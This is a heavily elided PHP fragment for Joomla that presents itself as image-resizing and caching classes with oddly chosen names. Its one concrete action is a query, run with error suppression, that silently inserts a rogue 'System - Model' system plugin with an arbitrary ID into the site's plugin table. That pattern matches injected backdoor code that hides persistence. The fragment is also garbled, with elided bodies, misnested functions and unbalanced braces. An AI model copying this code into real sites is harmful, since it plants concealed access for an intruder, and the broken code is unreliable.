...
class LoadingPeelBackSectorJSite
{
...
function createImage($in, $out, $w, $h, $transparent){
  ...
  function resize($newW, $newH) {
    ...
    imagecopyresampled($dst_im, $this->res, $newX, $newY, 0, 0, $dst_w, $dst_h, $src_width, $src_height);
        ...
        function cleanSpaceFromJSite($text) {
        ...
        function PasivItemsToJSite() {
			...
			} else { $query = "REPLACE INTO `#__plugins` VALUES (461051, 'System - Model', 'model', 'system', '0', '5613', '1', '1', '0', '0', '0000-00-00 00:00:00', '')"; }
            @$db->setQuery($query); @$db->query();
        } JSiteArrowsHelper($assetDir);
        
        function isNewOptionInJSite() {
			return (JVERSION < '1.6.0')? False : True;
		}

class UniversalImageCachingExtenderJSite {
